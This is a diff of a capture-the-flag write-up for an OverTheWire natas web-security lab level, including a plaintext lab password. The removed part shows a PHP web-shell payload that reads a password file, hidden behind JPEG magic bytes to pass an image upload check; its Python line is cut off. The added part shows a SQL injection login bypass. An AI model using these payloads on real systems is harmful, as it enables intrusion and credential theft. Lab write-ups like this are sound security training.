@@ -7,23 +7,15 @@
 **URL:**      http://natas14.natas.labs.overthewire.org
 
 ## Solution
-* Open inspect, there are button to upload an image (1kb) and button send us to a page contain the source code.
-* If you read the source code it is like the last one, generate random path with extention taken from requests to uploaded file, then put it in upload folder.
-* Write php script echo the password from pass folder
-```php
-<?php
-  echo shell_exec("cat /etc/natas_webpass/natas14");
-?>
+* Click view sourcecode there you can see the query they use to access, there isn't anything special so we can inject simple code to bypass.
 ```
-* Now if you upload it, he will say only images are allowed, from source code you know that they check file type using exif_imagetype() php function which reads the magic number for the file.
-* So first write JPEG magic number then your php script (to make magic number interprete as bytes we use pyhon3)
-```py
-  file = open('image', 'wb')
-  file.write(b'\xFF\xD8\xFF\xE0' + b'<? echo shell_exec("cat /etc/natas_webpass/natas14"); 
-  file.close()
+$query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\""; 
 ```
-* Upload the script then intercept requests with burpSuite to change filename extension to php to execute script onclick
+* Try login with any username and this password which implies that it will be always true.
+```
+123" or "1"="1
+```
 * You got the password!!
 
 ## Password
->   
+> AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J
